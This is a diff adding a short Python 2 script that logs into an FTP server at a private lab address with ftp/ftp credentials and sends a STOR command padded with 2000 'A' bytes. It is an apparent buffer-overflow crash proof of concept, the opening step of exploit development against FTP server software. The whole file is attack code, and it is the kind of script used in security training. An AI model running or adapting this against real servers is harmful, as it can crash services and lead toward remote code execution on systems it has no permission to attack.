@@ -1,0 +1,21 @@
+#!/usr/bin/python
+
+import socket
+
+buffer='\x41' * 2000
+
+print "Buffer inviato"
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('192.168.254.131',21))
+data=s.recv(1024)
+
+s.send('USER ftp\r\n')
+data=s.recv(1024)
+
+s.send('PASS ftp\r\n')
+data=s.recv(1024)
+
+s.send('STOR '+buffer+'\r\n')
+s.close
+
